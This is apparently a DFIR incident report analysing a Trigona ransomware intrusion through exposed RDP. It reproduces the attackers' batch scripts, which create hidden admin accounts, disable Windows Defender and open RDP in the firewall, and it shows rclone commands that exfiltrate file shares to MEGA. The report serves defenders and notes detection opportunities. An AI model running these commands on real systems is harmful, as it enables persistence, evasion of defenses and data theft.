			<h1 class="entry-title">Buzzing on Christmas Eve: Trigona Ransomware in 3 Hours</h1>
		<div class="entry-meta">
			<span class="posted-on"><a href="https://thedfirreport.com/2024/01/29/buzzing-on-christmas-eve-trigona-ransomware-in-3-hours/" rel="bookmark"><time class="entry-date published" datetime="2024-01-29T00:52:11+00:00">January 29, 2024</time></a></span>		</div><!-- .entry-meta -->

	<div class="entry-content">
		
<h2 class="wp-block-heading">Key Takeaways</h2>



<ul>
<li>In late December 2022, we observed threat actors exploiting a publicly exposed Remote Desktop Protocol (RDP) host, leading to data exfiltration and the deployment of Trigona ransomware.</li>
<li>On Christmas Eve, within just three hours of gaining initial access, the threat actors executed ransomware across the entire network.

</li>
<li>The threat actors employed a batch script to exfiltrate data, and dropped a series of other batch scripts that could hinder defensive measures, establish a user account, grant access through the firewall for RDP, and automate other intrusion actions.

</li>
<li>Throughout the intrusion, SoftPerfect&#8217;s Netscan played a pivotal role in conducting various discovery operations.</li>
</ul>



<p>More information on Trigona ransomware can be found on the following sites: <a href="https://www.trendmicro.com/en_za/research/23/f/an-overview-of-the-trigona-ransomware.html" target="_blank" rel="noreferrer noopener">TrendMicro</a>, <a href="https://unit42.paloaltonetworks.com/trigona-ransomware-update/" target="_blank" rel="noreferrer noopener">Unit42</a>, &amp; <a href="https://www.sentinelone.com/anthology/trigona/" target="_blank" rel="noreferrer noopener">SentinelOne</a>.</p>
<p>Now available on <a href="https://open.spotify.com/episode/7rFlGwrYILFr82h8w14kYq?si=hSQtvYY3T6SkacxfV4_3dQ" target="_blank" rel="noopener">Spotify</a>, <a href="https://youtu.be/1oIaHnFpslM" target="_blank" rel="noopener">YouTube</a>, <a href="https://podcasts.apple.com/us/podcast/buzzing-on-christmas-eve-trigona-ransomware-in-3-hours/id1728699064?i=1000643828282" target="_blank" rel="noopener">Apple,</a> <a href="https://www.audible.com/pd/Buzzing-on-Christmas-Eve-Trigona-Ransomware-in-3-Hours-Podcast/B0CTHXNV8F?ref_pageloadid=PAnukxHHhZJTfAYb&amp;ref=a_pd_Report_c3_lAsin_0_0&amp;pf_rd_p=625c212d-b95a-47db-8d56-d35a359de6e9&amp;pf_rd_r=0K1HSHGSX4JDYS0XB23K&amp;pageLoadId=oasAeMmWlqbKIjUv&amp;creativeId=6c5159d7-bb10-4fb4-929b-ae2b2f5000c7" target="_blank" rel="noopener">Audible</a>, <a href="https://www.pandora.com/podcast/reports/buzzing-on-christmas-eve-trigona-ransomware-in-3-hours/PE:1311023964" target="_blank" rel="noopener">Pandora</a> &amp; <a href="https://music.amazon.com/podcasts/c4fe897d-a4b4-4ceb-908d-d1a78af8cb6d/episodes/4d7cd97e-91df-405f-a33c-77eac5c0b641/reports-buzzing-on-christmas-eve-trigona-ransomware-in-3-hours" target="_blank" rel="noopener">Amazon Music</a>.</p>

<p><iframe style="border-radius: 12px;" src="
https://open.spotify.com/embed/episode/7rFlGwrYILFr82h8w14kYq?utm_source=generator" width="250" height="152" frameborder="0" allowfullscreen="allowfullscreen"></iframe></p>

<h2 id="case-summary" class="wp-block-heading"><a href="#case-summary">Case Summary</a></h2>



<p>This intrusion began when a threat actor gained access to an exposed RDP host. Notably, the login utilized legitimate credentials for the default Administrator account, with no evidence of brute-forcing. The logs revealed multiple remote logins to the same host in the preceding weeks, suggesting the presence of either a recurrent adversary or the potential involvement of an access broker.</p>



<p>Upon gaining access, the threat actor deployed a toolkit onto the beachhead host, which included an assortment of batch scripts, executables, and the <a href="https://www.softperfect.com/products/networkscanner/" target="_blank" rel="noreferrer noopener">SoftPerfect Netscan</a> tool. They then initiated network scans using Netscan, utilizing a custom configuration to automate typical discovery actions, as elaborated upon in the <a href="#discovery">discovery</a> section. As Netscan enumerated the network, the threat actor identified network shares and started exploring them, accessing various documents through a web browser.</p>



<p>Approximately 20 minutes after initial access, the threat actor began lateral movement by establishing an RDP connection to one of the file servers. The threat actor then copied their toolkit to the file server. Following this, the threat actor staged Rclone on the beachhead. However, before executing it, they proceeded to execute a sequence of commands aimed at disabling Windows Defender. With the way cleared, they proceeded to execute a batch script responsible for initiating the Rclone exfiltration process to <a href="https://Mega.io" target="_blank" rel="noreferrer noopener">Mega.io</a>. Additionally, they utilized RDP to access a second file server, where they executed the Rclone scripts again.</p>



<p>Approximately 45 minutes after the data extraction, the threat actor altered their Remote Desktop Protocol (RDP) connection. They logged out and then logged in to the beachhead host from a different IP address. Although the new IP and hostname deviate from the initial entry, it is important to note that the threat actor possessed comprehensive knowledge of the network, engaged with the previously compromised hosts, and employed identical techniques as previously observed. This evidence strongly indicates that this access was a continuation of the ongoing intrusion, possibly executed by the same individual or a collaborator within the group.</p>



<p>Both file share servers then received the same Windows Defender disabling treatment as the beachhead host. A RDP connection was also established with a backup server within the environment, and the identical series of disabling commands were executed. The threat actor then staged a ransomware binary on each of the hosts they had access to. Following this, they initiated the ransomware binary on each host through their RDP sessions.</p>



<p>In this case, the ransomware strain deployed was Trigona, which was executed approximately two hours and 49 minutes after the initial access. This ransomware had far-reaching consequences, affecting not only the host where it was initially executed but also propagating to all network-accessible hosts through the Server Message Block (SMB) protocol. Consequently, the victim faced a dual extortion impact, encompassing both the exfiltration of sensitive data and the encryption of systems through the use of the Trigona ransomware.</p>

<h2 id="initial-access" class="wp-block-heading"><a href="#initial-access">Initial Access</a></h2>



<p>Initial access was facilitated through a single Remote Desktop Protocol (RDP) connection from an IP address geo-located in Ukraine. While it&#8217;s challenging to pinpoint the actor&#8217;s initial access method due to limited evidence, the absence of brute force attempts and the use of valid credentials suggest that the threat actor may have obtained the domain Administrator password, potentially through leakage or purchase, particularly considering other external access events in the weeks leading up to the intrusion.</p>



<p>The initial RDP connection was a single event ID 4624 log (successful login). It was also a type 7 logon suggesting that the Administrator account had an open session which was unlocked. This is usually the result of disconnecting the session without fully signing out. This is corroborated with event ID 4778 reporting a resumed session for the user and IP address.</p>

<h2 id="persistence" class="wp-block-heading"><a href="#persistence">Persistence</a></h2>



<h3 class="wp-block-heading">Local accounts</h3>



<p>Two files were created by threat actors in order to create a new local user and add it to the local administrators group and Remote Desktop Users group. During the intrusion we did not observe them being executed, but since the threat actor dropped them we can assess that these are often used during their intrusion activity.</p>



<p>The first file, newuser.bat, uses WMIC to get the Local Administrators Group and Remote Desktop Users group names using the corresponding SIDs.</p>



<p>It then creates a user named sys with a password Taken1918 and adds it to these groups.</p>



<p><strong>newuser.bat</strong></p>
<pre>Set AdmGroupSID=S-1-5-32-544
Set AdmGroup=
For /F "UseBackQ Tokens=1* Delims==" %%I In (`WMIC Group Where "SID = '%AdmGroupSID%'" Get Name /Value ^| Find "="`) Do Set AdmGroup=%%J
Set AdmGroup=%AdmGroup:~0,-1%
net user sys Taken1918 /add
net localgroup %AdmGroup% sys /add

Set RDPGroupSID=S-1-5-32-555
Set RDPGroup=
For /F "UseBackQ Tokens=1* Delims==" %%I In (`WMIC Group Where "SID = '%RDPGroupSID%'" Get Name /Value ^| Find "="`) Do Set RDPGroup=%%J
Set RDPGroup=%RDPGroup:~0,-1%
net localgroup "%RDPGroup%" sys /add
net accounts /maxpwage:unlimited
</pre>



<p>The second script does similar activity but instead it uses the hardcoded group names.</p>



<p>One interesting thing is the creation of the registry value Support under <em>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList</em> which will hide the account Support account from the login screen. The script also creates a user named Support with a password of Kawa72ws. It also sets all local accounts to a max password age of unlimited.</p>



<p><strong>newnewuser.bat</strong></p>
<pre>bks -ipl iplist.txt -cmd "cmd.exe /c net user Support Kawa72ws /add 
net localgroup Administrators Support /add &amp; net localgroup \"Remote Desktop Users\" Support /add 
net accounts /maxpwage:unlimited 
reg add \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList\" /t REG_DWORD /f /d 0 /v Support"
</pre>

<h2 id="defense-evasion" class="wp-block-heading"><a href="#defense-evasion">Defense Evasion</a></h2>



<p>Upon initial connection, the threat actor dropped several Windows Batch scripts to disk, including scripts designed to disable security tooling.</p>



<p><strong>DefenderOFF.bat</strong></p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/01/19172-007.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-26159" src="https://thedfirreport.com/wp-content/uploads/2024/01/19172-007.png" alt="" width="1486" height="176" srcset="https://thedfirreport.com/wp-content/uploads/2024/01/19172-007.png 1486w, https://thedfirreport.com/wp-content/uploads/2024/01/19172-007-300x36.png 300w, https://thedfirreport.com/wp-content/uploads/2024/01/19172-007-1024x121.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/01/19172-007-768x91.png 768w" sizes="(max-width: 1486px) 100vw, 1486px" /></a></p>





<p>This batch file contained several registry entries commonly employed by threat actors designed to disable the built in Windows Defender. This particular script included a couple of FOR loops designed to automate disabling key services before the registry statements were made.</p>



<p>Take, for instance the first FOR loop:</p>



<pre>%~dp0\SU64 /w /c cmd.exe /cfor %%A IN (WinDefend WdFilter WdBoot Sense WdNisDrv WdNisSvc SecurityHealthService) DO net stop %%A</pre>



<p>The threat actor in this statement is utilizing a tool known as SUCMD (SU64) located in the batch file drive/folder path (%~dp0) to run elevated commands within the batch script. The SU64 tool is a Windows Command Line elevation tool; from the SUCMD project README:</p>



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p><em>If you are an active user of the Command Prompt on Windows, you will like this tiny utility. It allows you to run elevated programs without entering your password (but with UAC dialog). You could achieve similar behavior if you choose &#8220;Run as administrator&#8221; in context menu of a program, but it is not possible to achieve it from command line by default. As an additional useful and important feature, this utility preserves current directory instead of using c:\windows\system32\. So, if you run su from a Total Commander window, it will open cmd with elevated privileges, and in your current directory. Other similar utilities usually don&#8217;t preserve current directory, so cmd runs in c:\windows\system32\, and it is very inconvenient.</em></p>
</blockquote>



<p>This FOR loop iterates through a listing of the following services and stops them using the NET command:</p>



<ul class="wp-block-list">
<li><strong>WinDefend </strong>– Windows Defender Service</li>



<li><strong>WdFilter </strong>&#8211; Microsoft Defender Antivirus Mini-Filter Driver</li>



<li><strong>WdBoot </strong>&#8211; Microsoft Defender Antivirus Boot Driver</li>



<li><strong>Sense</strong> &#8211; Windows Defender Advanced Threat Protection Service (Sense) service</li>



<li><strong>WdNisDrv</strong> &#8211; Microsoft Defender Antivirus Network Inspection System Driver</li>



<li><strong>WdNisSvc </strong>&#8211; Microsoft Defender Antivirus Network Inspection Service</li>



<li><strong>SecurityHealthService</strong> &#8211; Security Health Service/Windows Security Service</li>
</ul>



<p>The script then utilizes the Sysinternals PSKILL64 binary to terminate several security related services. Finally, the script disables the aforementioned services, disables Defender with several registry statements, and hides the Defender settings page from visibility.</p>



<p>Interestingly enough, the threat actor in this case did not execute this script, preferring to manually run some of the commands (or similar commands) on the system to disable defenses. Of note, two of the third-party tools referenced by the script (SU64 and PSKILL64) were not included in the tool drop.</p>



<p><strong>Defense REvasion?</strong></p>



<p>Additionally interesting, the threat actor dropped (but did not execute) a script to reverse these changes and re-enable Windows Defender, aptly named: <strong>DefenderON.bat</strong></p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/01/19172-008.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-26160" src="https://thedfirreport.com/wp-content/uploads/2024/01/19172-008.png" alt="" width="1536" height="194" srcset="https://thedfirreport.com/wp-content/uploads/2024/01/19172-008.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/01/19172-008-300x38.png 300w, https://thedfirreport.com/wp-content/uploads/2024/01/19172-008-1024x129.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/01/19172-008-768x97.png 768w" sizes="(max-width: 1536px) 100vw, 1536px" /></a></p>

<h2 id="discovery" class="wp-block-heading"><a href="#discovery">Discovery</a></h2>



<p>After initial login, the threat actor ran a few commands that are common to many intrusions using built-in Windows utilities.</p>
<pre>"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" 
  --&gt; "C:\Windows\system32\net.exe" group /domain
  --&gt; "C:\Windows\system32\net.exe" group "domain admins" /domain
  --&gt; "C:\Windows\system32\whoami.exe"
</pre>



<p><strong>Netscan</strong></p>



<p>After these first commands, the threat actor employed Netscan to perform network discovery. This included copying a config file (netscan.xml) that allowed for several pre-configured custom &#8220;Applications&#8221; referencing batch scripts and binaries dropped in the initial tool drop.</p>



<p>The default Netscan only includes a couple of sample &#8220;Applications&#8221; &#8211; it appears the threat actor in this case has highly customized the instance of Netscan to use it as a centralized command tool to automate many actions, including removing Antivirus, adding new users, and modifying the firewall, all using PSEXEC. They have &#8220;Application&#8221; commands available to run if the user already has elevated rights or versions of the commands that can be supplied credentials later if elevation is required and obtained in later stages.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/01/19172-009.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-26161" src="https://thedfirreport.com/wp-content/uploads/2024/01/19172-009.png" alt="" width="921" height="485" srcset="https://thedfirreport.com/wp-content/uploads/2024/01/19172-009.png 921w, https://thedfirreport.com/wp-content/uploads/2024/01/19172-009-300x158.png 300w, https://thedfirreport.com/wp-content/uploads/2024/01/19172-009-768x404.png 768w" sizes="(max-width: 921px) 100vw, 921px" /></a></p>

<p>Part of the configuration file for Netscan included options to check for network shares when performing the enumeration.</p>

<p>The threat actor configured Netscan to enumerate write-access to network shares; in this case, the Netscan tool was run under domain administrator level access, so all enumerated shares were writable.</p>



<p>During analysis, running this option with Netscan appears to generate a Security Event ID 5145 that references a relative target &#8220;delete[.]me&#8221; generated when performing this write-access check by Netscan .</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/01/19172-014.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-26166" src="https://thedfirreport.com/wp-content/uploads/2024/01/19172-014.png" alt="" width="1894" height="667" srcset="https://thedfirreport.com/wp-content/uploads/2024/01/19172-014.png 1894w, https://thedfirreport.com/wp-content/uploads/2024/01/19172-014-300x106.png 300w, https://thedfirreport.com/wp-content/uploads/2024/01/19172-014-1024x361.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/01/19172-014-768x270.png 768w, https://thedfirreport.com/wp-content/uploads/2024/01/19172-014-1536x541.png 1536w" sizes="(max-width: 1894px) 100vw, 1894px" /></a></p>





<p>This activity was previously documented in SoftPerfect <a href="https://www.softperfect.com.cach3.com/board/read.php%3F12,10134,12202.html">support forum </a>as well as a <a href="https://content.vectra.ai/hubfs/downloadable-assets/RansomOps-Post-Incident-Report.pdf">ransomware report</a> published by Vectra in 2022. This provides a detection opportunity for defenders to be able to monitor for this event ID, to identify Netscan network share write enumeration in the early stages of an attack. An experimental Sigma rule has also been included. Similarly, this behavior can be observed over the network with tools like Zeek.</p>

<h2 id="lateral-movement" class="wp-block-heading"><a href="#lateral-movement">Lateral Movement</a></h2>



<p>Keeping it simple was the name of the game for this threat actor. Remote Desktop Protocol (RDP) was all that was necessary to facilitate the exfiltration of data and successful execution of ransomware. Using the beachhead as a pivot point, several RDP connections were initiated to high value targets such as file and backup servers.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/01/19172-018.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-26170" src="https://thedfirreport.com/wp-content/uploads/2024/01/19172-018.png" alt="" width="1347" height="592" srcset="https://thedfirreport.com/wp-content/uploads/2024/01/19172-018.png 1347w, https://thedfirreport.com/wp-content/uploads/2024/01/19172-018-300x132.png 300w, https://thedfirreport.com/wp-content/uploads/2024/01/19172-018-1024x450.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/01/19172-018-768x338.png 768w" sizes="(max-width: 1347px) 100vw, 1347px" /></a></p>





<p><em>Successful RDP connections to hosts on the network</em></p>



<p>Like with many other batch scripts already reviewed, openrdp.bat was another script that was part of the threat actor toolkit that did not see execution during this intrusion as RDP access was readily available across the environment. However this script would likely be used in the event of the threat actor operating in a more restricted environment.</p>



<p><strong>openrdp.bat</strong></p>
<pre>netsh advfirewall firewall add rule name="rdp" dir=in protocol=tcp localport=3389 action=allow
netsh advfirewall firewall set rule group="windows management instrumentation (wmi)" new enable=yes
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
</pre>



<p>Another tool (presumably to be used for lateral movement) dropped by the threat actor, but not employed in this incident, is a tool named <a href="https://www.donkz.nl/">Remote Desktop Plus</a>. Remote Desktop Plus is a RDP client with many options for session management and command line options. The version dropped was v4.0 originally released in 2012. From the tools website:</p>



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p>Remote Desktop Plus (RDP+) allows you to launch a Remote Desktop session using a username and password entered from the command line (autologin) or imported from a saved credential profile. It also features a unique kiosk mode, which, together with all the other available command line parameters, enables you to easily provide access to Remote Desktop sessions to third parties or end users.</p>
</blockquote>

<p><a href="https://thedfirreport.com/wp-content/uploads/2024/01/19172-029.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-26339" src="https://thedfirreport.com/wp-content/uploads/2024/01/19172-029.png" alt="" width="603" height="751" srcset="https://thedfirreport.com/wp-content/uploads/2024/01/19172-029.png 603w, https://thedfirreport.com/wp-content/uploads/2024/01/19172-029-241x300.png 241w" sizes="(max-width: 603px) 100vw, 603px" /></a></p>

<p><a href="https://thedfirreport.com/wp-content/uploads/2024/01/19172-020.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-26172" src="https://thedfirreport.com/wp-content/uploads/2024/01/19172-020.png" alt="" width="713" height="323" srcset="https://thedfirreport.com/wp-content/uploads/2024/01/19172-020.png 713w, https://thedfirreport.com/wp-content/uploads/2024/01/19172-020-300x136.png 300w" sizes="(max-width: 713px) 100vw, 713px" /></a></p>





<h2 class="wp-block-heading" id="exfiltration"><a href="#exfiltration">Exfiltration</a></h2>



<p>Two different suspicious batch scripts were dropped using RDP in the built-in Administrator&#8217;s Music folder on the beachhead and one of the file servers. Upon execution, these two .bat scripts execute rclone.exe to exfiltrate files from the victim file shares:</p>
<pre>cmd /c "C:\Users\Administrator\Music\start — копия.bat"
  --&gt; cd %~dp0
  --&gt; rclone.exe copy "\\[FILE SERVER]\human resources" MEGA:domain -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12

cmd /c "C:\Users\Administrator\Music\start — копия — копия.bat"
  --&gt; cd %~dp0
  --&gt; rclone.exe copy "\\[FILE SERVER]\Files" MEGA:domain -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12
</pre>



<p>Like <a href="https://thedfirreport.com/?s=mega.io" target="_blank" rel="noreferrer noopener">past reports</a> this threat actor also used the <a href="https://Mega.io" target="_blank" rel="noreferrer noopener">Mega.io</a> service as the remote exfiltration location for the stolen files. One interesting thing to mention is the naming convention for the scripts using копия, the Russian word for copy.</p>



<p>The configuration file for Rclone used by the threat actor was encrypted.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/01/19172-021.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-26173" src="https://thedfirreport.com/wp-content/uploads/2024/01/19172-021.png" alt="" width="608" height="130" srcset="https://thedfirreport.com/wp-content/uploads/2024/01/19172-021.png 608w, https://thedfirreport.com/wp-content/uploads/2024/01/19172-021-300x64.png 300w" sizes="(max-width: 608px) 100vw, 608px" /></a></p>





<p>According to <a href="https://rclone.org/docs/#configuration-encryption" target="_blank" rel="noreferrer noopener">Rclone documentation</a>:</p>



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p>rclone uses <a href="https://godoc.org/golang.org/x/crypto/nacl/secretbox" target="_blank" rel="noreferrer noopener">nacl secretbox</a> which in turn uses XSalsa20 and Poly1305 to encrypt and authenticate your configuration with secret-key cryptography. The password is SHA-256 hashed, which produces the key for secretbox. The hashed password is not stored.</p>
</blockquote>



<p>This OPSEC by the threat actor helps mask the exfiltration account and other data that a less mindful threat actor may leave behind.</p>

<ul class="wp-block-list">
<li><em>* Trigona</em> is a ransomware family written in the Delphi programming language that has been active since at least June 2022* The Trigona threat group claims to perform double extortion attacks by combining data exfiltration with file encryption* Trigona utilizes 4,112-bit RSA and 256-bit AES encryption in OFB mode for file encryption* The file decryption process is fairly convoluted with a tool that requires several steps to function properly* The ransomware has been regularly updated with new capabilities including a new data wiper feature</li>
